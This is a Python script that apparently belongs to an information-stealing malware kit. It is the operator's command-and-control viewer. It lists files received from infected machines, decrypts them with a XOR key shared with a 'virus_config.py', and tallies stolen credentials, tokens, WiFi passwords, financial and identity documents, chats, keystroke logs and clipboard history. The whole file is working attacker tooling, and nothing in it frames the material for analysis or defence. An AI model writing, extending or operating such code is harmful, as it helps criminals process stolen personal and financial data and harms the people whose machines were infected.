#!/usr/bin/env python3
"""
Script to view and decrypt data received on C2 server
Usage: python3 view_server_data.py [filename]
"""
import json
import base64
import hashlib
import sys
import os
import glob
from datetime import datetime

# IMPORTANT: This must match C2_KEY in virus_config.py
C2_KEY = "default_key_change_me"

def decrypt_data(encrypted_data, key=None):
    """Decrypt XOR encrypted data"""
    if key is None:
        key = C2_KEY
    try:
        key_hash = hashlib.sha256(key.encode()).digest()
        data = base64.b64decode(encrypted_data)
        decrypted = bytearray()
        for i, byte in enumerate(data):
            decrypted.append(byte ^ key_hash[i % len(key_hash)])
        return bytes(decrypted).decode('utf-8', errors='ignore')
    except Exception as e:
        return None

def view_plain_json(filename):
    """View plain JSON file"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        print("=" * 70)
        print(f"📄 File: {filename}")
        print("=" * 70)
        
        # Show statistics if available
        if 'statistics' in data:
            print("\n📊 STATISTICS:")
            print("-" * 70)
            for key, value in sorted(data['statistics'].items()):
                print(f"  {key}: {value}")
        
        # Show summary of collected data
        print("\n📦 COLLECTED DATA SUMMARY:")
        print("-" * 70)
        
        if 'unified_credentials' in data:
            count = len(data['unified_credentials'])
            print(f"  🔑 Unified Credentials: {count}")
        
        if 'unified_files' in data:
            count = len(data['unified_files'])
            print(f"  📁 Unified Files: {count}")
        
        if 'unified_tokens' in data:
            count = len(data['unified_tokens'])
            print(f"  🎫 Unified Tokens: {count}")
        
        if 'wifi_passwords' in data:
            count = len(data['wifi_passwords'])
            print(f"  📶 WiFi Passwords: {count}")
        
        if 'databases' in data:
            count = len(data['databases'])
            print(f"  💾 Databases: {count}")
        
        if 'recent_documents' in data:
            count = len(data['recent_documents'])
            print(f"  📄 Documents: {count}")
        
        if 'financial_data' in data:
            count = len(data['financial_data'])
            print(f"  💰 Financial Data: {count}")
        
        if 'identity_documents' in data:
            count = len(data['identity_documents'])
            print(f"  🆔 Identity Documents: {count}")
        
        if 'email_contacts_content' in data:
            count = len(data['email_contacts_content'])
            print(f"  📧 Email Contacts/Content: {count}")
        
        if 'chat_messages' in data:
            count = len(data['chat_messages'])
            print(f"  💬 Chat Messages: {count}")
        
        if 'keyboard_logs' in data:
            log_len = len(data['keyboard_logs']) if isinstance(data['keyboard_logs'], str) else 0
            log_lines = data.get('keyboard_logs_lines', 0)
            print(f"  ⌨️  Keyboard Logs: {log_len} characters, {log_lines} lines")
        
        if 'clipboard_history' in data:
            clip_count = len(data['clipboard_history']) if isinstance(data['clipboard_history'], list) else 0
            print(f"  📋 Clipboard History: {clip_count} entries")
        
        print("\n" + "=" * 70)
        print(f"💡 To view full data: cat {filename} | less")
        print(f"💡 To view specific section: python3 -c \"import json; data=json.load(open('{filename}')); print(json.dumps(data['unified_credentials'], indent=2))\"")
        print("=" * 70)
        
    except Exception as e:
        print(f"Error reading file: {e}")

def decrypt_encrypted_file(filename):
    """Decrypt encrypted JSON file"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            encrypted_info = json.load(f)
        
        encrypted_data = encrypted_info.get('encrypted_data')
        if not encrypted_data:
            print(f"Error: No encrypted_data found in {filename}")
            return
        
        print(f"Decrypting {filename}...")
        decrypted_json = decrypt_data(encrypted_data, C2_KEY)
        
        if decrypted_json:
            try:
                plain_data = json.loads(decrypted_json)
                
                # Save decrypted file
                output_file = filename.replace('_encrypted.json', '_decrypted.json')
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump(plain_data, f, indent=2, ensure_ascii=False)
                
                print(f"✅ Decrypted successfully!")
                print(f"📁 Saved to: {output_file}")
                
                # View the decrypted data
                view_plain_json(output_file)
                
            except json.JSONDecodeError:
                # Not JSON, save as text
                output_file = filename.replace('_encrypted.json', '_decrypted.txt')
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(decrypted_json)
                print(f"✅ Decrypted (not JSON, saved as text)")
                print(f"📁 Saved to: {output_file}")
        else:
            print(f"❌ Decryption failed!")
            print(f"⚠️  Check if C2_KEY matches virus_config.py")
            print(f"   Current C2_KEY: {C2_KEY}")
    
    except Exception as e:
        print(f"Error: {e}")

def list_received_files(data_dir="received_data"):
    """List all received data files"""
    if not os.path.exists(data_dir):
        print(f"Directory {data_dir} does not exist")
        return []
    
    files = []
    # Find all plain JSON files
    plain_files = glob.glob(f"{data_dir}/*_plain.json")
    # Find all encrypted JSON files
    encrypted_files = glob.glob(f"{data_dir}/*_encrypted.json")
    
    files.extend(plain_files)
    files.extend(encrypted_files)
    files.sort(reverse=True)  # Newest first
    
    return files

def main():
    print("=" * 70)
    print("🔍 C2 Server Data Viewer")
    print("=" * 70)
    
    if len(sys.argv) > 1:
        filename = sys.argv[1]
        if os.path.exists(filename):
            if '_plain.json' in filename:
                view_plain_json(filename)
            elif '_encrypted.json' in filename:
                decrypt_encrypted_file(filename)
            else:
                print(f"Unknown file type: {filename}")
                print("Expected: *_plain.json or *_encrypted.json")
        else:
            print(f"File not found: {filename}")
    else:
        # List all files
        files = list_received_files()
        
        if not files:
            print("No data files found in received_data/")
            print("Make sure C2 server has received data.")
            return
        
        print(f"\n📁 Found {len(files)} data file(s):\n")
        
        for i, filename in enumerate(files, 1):
            file_type = "✅ Plain JSON" if '_plain.json' in filename else "🔒 Encrypted"
            size = os.path.getsize(filename)
            mtime = datetime.fromtimestamp(os.path.getmtime(filename))
            
            print(f"  [{i}] {file_type}")
            print(f"      File: {filename}")
            print(f"      Size: {size:,} bytes")
            print(f"      Date: {mtime.strftime('%Y-%m-%d %H:%M:%S')}")
            print()
        
        print("=" * 70)
        print("Usage:")
        print(f"  python3 {sys.argv[0]} <filename>  # View/decrypt specific file")
        print()
        print("Examples:")
        if files:
            print(f"  python3 {sys.argv[0]} {files[0]}")
        print("=" * 70)

if __name__ == "__main__":
    main()

